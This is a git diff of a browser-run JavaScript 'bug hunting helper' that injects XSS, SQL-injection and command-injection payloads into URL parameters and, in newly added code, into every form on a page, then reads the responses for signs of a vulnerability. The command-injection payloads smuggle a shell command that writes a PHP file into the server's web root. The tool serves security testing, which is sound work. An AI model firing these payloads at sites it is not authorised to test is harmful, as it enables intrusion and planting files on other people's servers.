@@ -1,3 +1,4 @@
+/* eslint-disable no-undef */
 // Created by Davide Cavallini
 
 // linkedin: https://www.linkedin.com/in/davidecavallini/
@@ -12,6 +13,11 @@ function JsBugHuntingHelper () {
   const xssScanEnabled = true
   const sqlInjectionScanEnabled = true
   const RCEscanEnabled = true
+  const formFuzzingEnabled = true
+
+  const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div ', "'"]
+  const payloadsSQLi = ['"', "'"]
+  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#']
 
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
@@ -36,6 +42,9 @@ function JsBugHuntingHelper () {
     }
     if (RCEscanEnabled === true) {
       testRCE()
+    }
+    if (formFuzzingEnabled === true) {
+      formFuzzer()
     }
     console.log('\n')
     console.log('----------------------------------------------------------')
@@ -314,12 +323,10 @@ function JsBugHuntingHelper () {
   }
 
   async function testXSS () {
-    const payloads = ['<script>alert("XSS_VULNERABLE_PARAM")</script>',
-      '"><script>alert("XSS_VULNERABLE_PARAM")</script><div ', "'"]
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
-      for (const payload of payloads) {
+      for (const payload of payloadsXSS) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
         const v = paramsEntities[i]
         v[1] = v[1] + payload
@@ -342,11 +349,10 @@ function JsBugHuntingHelper () {
   }
 
   async function testSqlInjection () {
-    const payloads = ['"', "'"]
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
-      for (const payload of payloads) {
+      for (const payload of payloadsSQLi) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
         const v = paramsEntities[i]
         v[1] = v[1] + payload
@@ -369,11 +375,10 @@ function JsBugHuntingHelper () {
   }
 
   async function testRCE () {
-    const payloads = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#']
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
-      for (const payload of payloads) {
+      for (const payload of payloadsRCE) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
         const v = paramsEntities[i]
         v[1] = v[1] + payload
@@ -396,10 +401,102 @@ function JsBugHuntingHelper () {
       }
     }
   }
+
+  // fuzz all forms in the webpage
+  async function formFuzzer () {
+    // eslint-disable-next-line no-undef
+    $('form').each((i, form) => {
+      const originalParamsLength = $(form).find('input,button,select,checkbox').length
+
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsXSS) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            // eslint-disable-next-line no-undef
+            // console.log($(v2).attr('name'), $(v2).val())
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'XSS', tempParams[i].name)
+        }
+      }
+
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsSQLi) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            // eslint-disable-next-line no-undef
+            // console.log($(v2).attr('name'), $(v2).val())
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'SQLi', tempParams[i].name)
+        }
+      }
+
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsRCE) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            // eslint-disable-next-line no-undef
+            // console.log($(v2).attr('name'), $(v2).val())
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'RCE', tempParams[i].name)
+        }
+      }
+    })
+  }
+
+  function sendFormRequest (form, params, vulnType, modifiedParam) {
+    // eslint-disable-next-line no-undef
+    const url = $(form).attr('action')
+    // eslint-disable-next-line no-undef
+    if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post') {
+      // eslint-disable-next-line no-undef
+      $.post(url, params).done(function (data) {
+        if (vulnType === 'XSS') {
+          if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
+            console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
+          }
+        } else if (vulnType === 'SQLi') {
+          if (data.indexOf('Uncaught mysql') !== -1) {
+            console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+          }
+        } else if (vulnType === 'RCE') {
+          // qui è giusto che sia get, in quanto è un altra richiesta
+          $.get(document.location.origin + '/testRCE.php').done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              console.log('Parametro POST "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+            }
+          })
+        }
+      })
+    } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get') {
+      $.get(url, params).done(function (data) {
+        if (vulnType === 'XSS') {
+          if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
+            console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
+          }
+        } else if (vulnType === 'SQLi') {
+          if (data.indexOf('Uncaught mysql') !== -1) {
+            console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+          }
+        } else if (vulnType === 'RCE') {
+          $.get(document.location.origin + '/testRCE.php').done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              console.log('Parametro GET "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+            }
+          })
+        }
+      })
+    }
+  }
 }
 
 // eslint-disable-next-line no-var, no-unused-vars
 var jBHH = new JsBugHuntingHelper()
-
-// ONLY CHROME AND EDGE
-// javascript:(function () { var a = document.createElement('script'); a.src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"; document.body.appendChild(a); a.onload = function () { var b = document.createElement('script'); b.src="//cdn.jsdelivr.net/gh/dade1987/jsBugHuntingHelper/jsBugHuntingHelper.min.js"; document.body.appendChild(b); b.onload = function () { jBHH.init() } } })();
